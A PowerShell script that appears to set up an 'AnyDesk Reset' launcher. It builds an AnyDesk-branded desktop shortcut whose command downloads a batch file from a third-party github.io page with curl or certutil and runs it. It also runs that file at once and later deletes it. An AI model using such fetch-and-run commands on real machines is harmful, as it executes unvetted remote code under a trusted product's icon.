$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$desktop   = [Environment]::GetFolderPath('Desktop')
$iconDir   = Join-Path $env:LOCALAPPDATA 'AnyDeskLauncher'
$iconPath  = Join-Path $iconDir 'anydesk.ico'
$lnkPath   = Join-Path $desktop 'AnyDesk.lnk'
$batchPath = Join-Path $env:TEMP 'initad.bat'
$progPath  = Join-Path $env:TEMP 'progress.ps1'
$batchUrl  = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'

$webClient = New-Object Net.WebClient
$webClient.Headers.Add('User-Agent', 'Mozilla/5.0')

try {
    $html = $webClient.DownloadString('https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid')

    if ($html -match '(https://play-lh\.googleusercontent\.com/[^\s"&]+)') {
        $pngUrl   = $matches[1] + '=s256'
        $pngBytes = $webClient.DownloadData($pngUrl)

        $width  = 256
        $height = 256
        if ($width  -ge 256) { $width  = 0 }
        if ($height -ge 256) { $height = 0 }

        $imageSize = $pngBytes.Length
        $offset    = 6 + 16

        $icoBytes = New-Object System.Collections.Generic.List[byte]
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]0))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]1))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]1))
        $icoBytes.Add([byte]$width)
        $icoBytes.Add([byte]$height)
        $icoBytes.Add([byte]0)
        $icoBytes.Add([byte]0)
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]1))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]32))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt32]$imageSize))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt32]$offset))
        $icoBytes.AddRange($pngBytes)

        if (-not (Test-Path $iconDir)) {
            New-Item -ItemType Directory -Path $iconDir -Force | Out-Null
        }
        [System.IO.File]::WriteAllBytes($iconPath, $icoBytes.ToArray())
    } else {
        throw "Can't process URL."
    }
} catch {
    Write-Warning "Can't create icon: $_"
}

$url    = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
$q      = [char]34
$aa     = [char]38 + [char]38
$cmdExe = "$env:SystemRoot\System32\cmd.exe"
$tmp    = $env:TEMP + '\initad.bat'

if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $aa + ' call ' + $q + $tmp + $q + $q
} else {
    $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $aa + ' ' + $q + $tmp + $q + $q
}

try {
    $ws       = New-Object -ComObject WScript.Shell
    $shortcut = $ws.CreateShortcut($lnkPath)
    $shortcut.TargetPath  = $cmdExe
    $shortcut.Arguments   = $lnkArgs
    $shortcut.WindowStyle = 1
    $shortcut.Description = 'AnyDesk Reset'
    if (Test-Path $iconPath) { $shortcut.IconLocation = "$iconPath,0" }
    $shortcut.Save()
} catch {
    Write-Warning "Can't create shortcut: $_"
}

try {
    $webClient.DownloadFile($batchUrl, $batchPath)
} catch {
    Write-Warning "Can't download initad.bat: $_"
    return
}

Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$batchPath`""

$presentStreak  = 0
$phase1Deadline = (Get-Date).AddMinutes(5)
while ((Get-Date) -lt $phase1Deadline -and $presentStreak -lt 3) {
    if (Get-Process -Name 'AnyDesk' -ErrorAction SilentlyContinue) {
        $presentStreak++
    } else {
        $presentStreak = 0
    }
    Start-Sleep -Seconds 2
}

$absentStreak = 0
while ($absentStreak -lt 3) {
    if (Get-Process -Name 'AnyDesk' -ErrorAction SilentlyContinue) {
        $absentStreak = 0
    } else {
        $absentStreak++
    }
    Start-Sleep -Seconds 2
}

Start-Sleep -Seconds 2

for ($i = 0; $i -lt 30; $i++) {
    if (-not (Test-Path $batchPath)) { break }
    try {
        Remove-Item $batchPath -Force -ErrorAction Stop
        break
    } catch {
        Start-Sleep -Seconds 2
    }
}

Remove-Item $progPath -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $lnkPath)) {
    Write-Warning "Can't find $lnkPath"
}